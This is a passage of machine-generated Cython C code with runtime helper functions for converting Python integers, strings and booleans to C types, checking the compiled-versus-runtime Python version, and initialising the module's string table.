                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

 
static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

 
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif  
